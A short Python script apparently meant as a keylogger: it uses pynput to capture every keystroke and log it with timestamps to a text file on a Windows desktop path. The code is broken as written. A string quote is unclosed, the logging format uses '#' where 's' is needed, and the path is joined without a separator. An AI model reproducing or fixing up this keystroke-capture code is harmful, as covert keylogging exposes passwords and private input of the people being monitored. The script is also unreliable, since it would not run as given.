from pynput.keyboard import Key, Listener
import logging


log_dir = "C:/User/Owner/Desktop"


logging.basicConfig(filename=(log_dir + "key_log.txt), level=logging.DEBUG, format='%(asctime)#: %(message)#')


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()
